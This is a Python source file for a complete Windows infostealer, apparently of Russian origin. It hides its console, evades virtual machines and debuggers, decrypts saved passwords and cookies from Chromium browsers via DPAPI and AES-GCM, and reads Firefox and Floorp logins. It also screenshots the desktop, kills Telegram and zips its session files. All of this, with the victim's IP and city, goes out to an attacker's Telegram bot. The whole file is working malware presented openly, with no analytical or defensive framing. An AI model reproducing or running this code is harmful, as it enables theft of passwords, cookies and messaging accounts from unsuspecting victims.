import sys
import os

if sys.platform == "win32":
    try:
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

import json
import base64
import sqlite3
import requests
import shutil
import zipfile
import tempfile
import psutil
import warnings
from pathlib import Path
from datetime import datetime
from Crypto.Cipher import AES
import win32crypt
import time
import random

time.sleep(random.randint(2, 5))

if any(proc in os.environ.get("PROCESSOR_IDENTIFIER", "").lower() for proc in ["vmware", "virtualbox", "qemu"]):
    sys.exit(0)

if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
    sys.exit(0)

warnings.filterwarnings("ignore")

# Конфигурация
BOT_TOKEN = ""
CHAT_ID = ""

class DataStealer:
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.chat_id = CHAT_ID
        
        self.browsers = {
            'edge': os.environ['USERPROFILE'] + r'\AppData\Local\Microsoft\Edge\User Data',
            'chrome': os.environ['USERPROFILE'] + r'\AppData\Local\Google\Chrome\User Data', 
            'yandex': os.environ['USERPROFILE'] + r'\AppData\Local\Yandex\YandexBrowser\User Data',
            'firefox': os.environ['USERPROFILE'] + r'\AppData\Roaming\Mozilla\Firefox\Profiles',
            'floorp': os.environ['USERPROFILE'] + r'\AppData\Roaming\Floorp\Profiles',
            'opera': os.environ['USERPROFILE'] + r'\AppData\Roaming\Opera Software\Opera Stable',
            'opera_gx': os.environ['USERPROFILE'] + r'\AppData\Roaming\Opera Software\Opera GX Stable',
            'brave': os.environ['USERPROFILE'] + r'\AppData\Local\BraveSoftware\Brave-Browser\User Data',
            'thorium': os.environ['USERPROFILE'] + r'\AppData\Local\Thorium\User Data'
        }
        
        self.target_clients = ["Telegram", "Telegram.exe", "AyuGram", "Kotatogram", "iMe"]
        self.session_files = ["key_datas", "settingss", "usertag"]
        self.session_subfiles = ["maps", "configs"]
        self.standard_paths = [
            Path(os.getenv('APPDATA')) / 'Telegram Desktop' / 'tdata',
            Path(os.getenv('LOCALAPPDATA')) / 'Telegram Desktop' / 'tdata'
        ]

    def take_screenshot(self):
        try:
            from PIL import ImageGrab
            screenshot = ImageGrab.grab()
            temp_dir = tempfile.gettempdir()
            screenshot_path = os.path.join(temp_dir, f"screenshot_{os.getpid()}.png")
            screenshot.save(screenshot_path, "PNG")
            return screenshot_path
        except Exception:
            return None

    def send_screenshot(self):
        screenshot_path = self.take_screenshot()
        if not screenshot_path:
            return
            
        try:
            url_photo = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
            with open(screenshot_path, 'rb') as photo:
                files = {'photo': photo}
                data = {'chat_id': self.chat_id, 'caption': '📸 SCREENSHOT'}
                requests.post(url_photo, files=files, data=data)
        except Exception:
            pass
        finally:
            try:
                if os.path.exists(screenshot_path):
                    os.remove(screenshot_path)
            except:
                pass

    def get_master_key(self, browser_path):
        try:
            with open(browser_path + r"\Local State", "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return "Failed to decrypt"

    def get_chrome_passwords(self, browser_name, browser_path, profile_name):
        passwords = []
        master_key = self.get_master_key(browser_path)
        
        login_db = os.path.join(browser_path, profile_name, "Login Data")
        if not os.path.exists(login_db):
            return passwords
        
        shutil.copy2(login_db, "temp_db")
        conn = sqlite3.connect("temp_db")
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if url and username and encrypted_password:
                    decrypted_password = self.decrypt_password(encrypted_password, master_key)
                    if decrypted_password != "Failed to decrypt":
                        passwords.append(f"[{browser_name}] {url} | {username} | {decrypted_password}")
        except Exception:
            pass
        
        conn.close()
        os.remove("temp_db")
        return passwords

    def get_firefox_based_passwords(self, browser_name, browser_path):
        passwords = []
        
        if not os.path.exists(browser_path):
            return passwords
        
        profiles = []
        for item in os.listdir(browser_path):
            if os.path.isdir(os.path.join(browser_path, item)) and (item.endswith('.default') or item.endswith('.default-release')):
                profiles.append(item)
        
        if not profiles:
            profiles = [item for item in os.listdir(browser_path) if os.path.isdir(os.path.join(browser_path, item))]
        
        for profile in profiles:
            profile_path = os.path.join(browser_path, profile)
            logins_db = os.path.join(profile_path, "logins.sqlite")
            
            if os.path.exists(logins_db):
                try:
                    shutil.copy2(logins_db, "firefox_temp.db")
                    conn = sqlite3.connect("firefox_temp.db")
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT hostname, username, password FROM moz_logins")
                    
                    for row in cursor.fetchall():
                        hostname, username, password = row
                        if password:
                            try:
                                if isinstance(password, bytes):
                                    decrypted_pass = password.decode('utf-8', errors='ignore')
                                else:
                                    decrypted_pass = str(password)
                                passwords.append(f"[{browser_name}] {hostname} | {username} | {decrypted_pass}")
                            except:
                                passwords.append(f"[{browser_name}] {hostname} | {username} | [ENCRYPTED]")
                    
                    conn.close()
                    os.remove("firefox_temp.db")
                    
                except Exception:
                    if os.path.exists("firefox_temp.db"):
                        os.remove("firefox_temp.db")
        
        return passwords

    def get_cookies(self, browser_name, browser_path, profile_name):
        cookies = []
        master_key = self.get_master_key(browser_path)
        
        cookie_db = os.path.join(browser_path, profile_name, "Network", "Cookies")
        if not os.path.exists(cookie_db):
            return cookies
        
        shutil.copy2(cookie_db, "temp_cookies")
        conn = sqlite3.connect("temp_cookies")
        cursor = conn.cursor()
        
        try:
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
            for host_key, name, encrypted_value in cursor.fetchall():
                if host_key and name:
                    decrypted_value = self.decrypt_password(encrypted_value, master_key)
                    if decrypted_value != "Failed to decrypt":
                        cookies.append(f"[{browser_name} COOKIE] {host_key} | {name} | {decrypted_value}")
        except:
            pass
        
        conn.close()
        os.remove("temp_cookies")
        return cookies

    def get_ip_info(self):
        ip_info = {"ip": "Unknown", "city": "Unknown"}
        try:
            geo_response = requests.get("http://ip-api.com/json/?fields=66846719", timeout=6).json()
            if geo_response.get("status") == "success":
                ip_info["ip"] = geo_response.get("query", "Unknown")
                ip_info["city"] = geo_response.get("city", "Unknown")
            return ip_info
        except:
            return ip_info
    
    def find_telegram_process(self):
        try:
            for proc in psutil.process_iter(['name', 'exe']):
                if proc.info['name'] in self.target_clients:
                    return proc
        except:
            pass
        return None
    
    def kill_process(self, proc):
        try:
            proc.kill()
            proc.wait(timeout=0.5)
            return True
        except:
            return False
    
    def find_tdata_directory(self, process_path=None):
        for path in self.standard_paths:
            if path.exists():
                return path
        if process_path:
            try:
                process_dir = Path(process_path).parent
                tdata_path = process_dir / "tdata"
                if tdata_path.exists():
                    return tdata_path
            except:
                pass
        return None
    
    def collect_session_files(self, tdata_path):
        files = []
        for file in self.session_files:
            file_path = tdata_path / file
            if file_path.exists():
                files.append(file_path)
        for item in tdata_path.iterdir():
            if item.is_dir():
                marker_file = tdata_path / f"{item.name}s"
                if marker_file.exists():
                    files.extend([marker_file, item])
                    for subfile in self.session_subfiles:
                        subfile_path = item / subfile
                        if subfile_path.exists():
                            files.append(subfile_path)
        return files

    def create_zip_archive(self, files):
        try:
            temp_dir = tempfile.gettempdir()
            zip_path = os.path.join(temp_dir, f"tdata_{os.getpid()}.zip")
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                for file in files:
                    if file.is_file():
                        zipf.write(file, file.name)
                    elif file.is_dir():
                        for f in file.rglob('*'):
                            if f.is_file():
                                arcname = os.path.join(file.name, os.path.relpath(f, file))
                                zipf.write(f, arcname)
            return zip_path
        except:
            return None

    def send_to_telegram(self, data, filename, caption=""):
        try:
            url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            
            with open(filename, "w", encoding="utf-8") as f:
                f.write(data)
            
            with open(filename, "rb") as f:
                files = {"document": (filename, f)}
                params = {"chat_id": self.chat_id, "caption": caption}
                requests.post(url, files=files, data=params)
        except Exception:
            pass
        finally:
            try:
                os.remove(filename)
            except:
                pass

    def send_telegram_session(self, zip_path, client_name, ip_info):
        try:
            url_doc = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
            caption = f"IP: {ip_info['ip']}\nCity: {ip_info['city']}"
            if client_name:
                caption = f"{client_name}\n{caption}"
                
            with open(zip_path, 'rb') as doc:
                files = {'document': doc}
                data = {'chat_id': self.chat_id, 'caption': caption}
                requests.post(url_doc, files=files, data=data)
                return True
        except Exception:
            return False

    def steal_browser_data(self):
        all_data = "=== ПОЛНЫЙ ДАМП БРАУЗЕРОВ ===\n"
        all_data += f"Время сбора: {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}\n\n"
        
        for browser_name, browser_path in self.browsers.items():
            if browser_name in ['firefox', 'floorp']:
                continue
                
            if os.path.exists(browser_path):
                all_data += f"\n--- {browser_name.upper()} ---\n"
                
                passwords = self.get_chrome_passwords(browser_name, browser_path, "Default")
                if passwords:
                    all_data += "ПАРОЛИ:\n" + "\n".join(passwords) + "\n"
                else:
                    all_data += "Пароли не найдены\n"
                
                cookies = self.get_cookies(browser_name, browser_path, "Default")
                if cookies:
                    all_data += "\nCOOKIES (первые 10):\n" + "\n".join(cookies[:10]) + "\n"
        
        all_data += "\n--- FIREFOX ---\n"
        firefox_passwords = self.get_firefox_based_passwords("FIREFOX", self.browsers['firefox'])
        if firefox_passwords:
            all_data += "ПАРОЛИ:\n" + "\n".join(firefox_passwords) + "\n"
        else:
            all_data += "Пароли не найдены\n"
        
        all_data += "\n--- FLOORP ---\n"
        floorp_passwords = self.get_firefox_based_passwords("FLOORP", self.browsers['floorp'])
        if floorp_passwords:
            all_data += "ПАРОЛИ:\n" + "\n".join(floorp_passwords) + "\n"
        else:
            all_data += "Пароли не найдены\n"
        
        return all_data

    def steal_telegram_sessions(self):
        ip_info = self.get_ip_info()
        proc = self.find_telegram_process()
        client_name = None
        process_path = None
        
        if proc is not None:
            client_name = proc.info['name']
            process_path = proc.info['exe']
            self.kill_process(proc)
        
        tdata_path = self.find_tdata_directory(process_path)
        if tdata_path is None:
            return
        
        files = self.collect_session_files(tdata_path)
        if not files:
            return
        
        zip_path = self.create_zip_archive(files)
        if zip_path is None:
            return
        
        self.send_telegram_session(zip_path, client_name, ip_info)
        
        try:
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except:
            pass

    def run(self):
        # 1. Скриншот
        self.send_screenshot()
        
        # 2. Браузерные данные
        browser_data = self.steal_browser_data()
        browser_filename = f"browsers_{datetime.now().strftime('%d%m%Y_%H%M%S')}.txt"
        self.send_to_telegram(
            browser_data, 
            browser_filename, 
            f"Browser Data - {datetime.now().strftime('%d.%m.%Y %H:%M:%S')}"
        )
        
        # 3. Tdata
        self.steal_telegram_sessions()

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    DataStealer().run()
